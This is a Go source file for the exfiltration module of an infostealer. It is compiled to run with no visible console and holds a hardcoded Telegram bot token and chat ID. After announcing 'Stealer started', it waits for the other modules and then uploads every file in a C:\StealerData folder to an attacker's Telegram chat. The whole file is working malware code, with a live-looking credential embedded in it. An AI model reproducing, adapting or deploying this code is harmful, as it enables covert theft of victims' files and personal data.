// ============================================================
// bot.go - Go Telegram Bot
// Compile: go build -ldflags="-H windowsgui -s -w" -o bot.exe bot.go
// ============================================================

package main

import (
    "bytes"
    "encoding/json"
    "fmt"
    "io"
    "net/http"
    "os"
    "path/filepath"
    "time"
)

const (
    Token  = "8528053368:AAF5faIvI90mjkViQ-CY9Lo-nAjyjiWP6lY"
    ChatID = "8516763046"
)

type Bot struct {
    client *http.Client
}

func NewBot() *Bot {
    return &Bot{client: &http.Client{Timeout: 30 * time.Second}}
}

func (b *Bot) SendMessage(text string) error {
    url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", Token)
    data := map[string]string{"chat_id": ChatID, "text": text}
    jsonData, _ := json.Marshal(data)
    
    resp, err := b.client.Post(url, "application/json", bytes.NewBuffer(jsonData))
    if err != nil {
        return err
    }
    defer resp.Body.Close()
    return nil
}

func (b *Bot) SendFile(filePath string) error {
    file, err := os.Open(filePath)
    if err != nil {
        return err
    }
    defer file.Close()
    
    url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", Token)
    
    body := &bytes.Buffer{}
    _, err = io.Copy(body, file)
    if err != nil {
        return err
    }
    
    req, _ := http.NewRequest("POST", url, body)
    q := req.URL.Query()
    q.Add("chat_id", ChatID)
    req.URL.RawQuery = q.Encode()
    req.Header.Set("Content-Type", "application/octet-stream")
    
    _, err = b.client.Do(req)
    return err
}

func (b *Bot) SendDirectory(dirPath string) {
    b.SendMessage("📦 Sending collected data...")
    
    files, _ := os.ReadDir(dirPath)
    for _, f := range files {
        if !f.IsDir() {
            fullPath := filepath.Join(dirPath, f.Name())
            b.SendFile(fullPath)
            time.Sleep(500 * time.Millisecond)
        }
    }
    b.SendMessage("✅ All data sent!")
}

func main() {
    // Ẩn console
    // (Windows GUI mode - no console)
    
    bot := NewBot()
    bot.SendMessage("🚀 Stealer started, collecting data...")
    
    // Đợi các module khác hoàn thành
    time.Sleep(30 * time.Second)
    
    // Gửi dữ liệu
    bot.SendDirectory("C:\\StealerData")
}
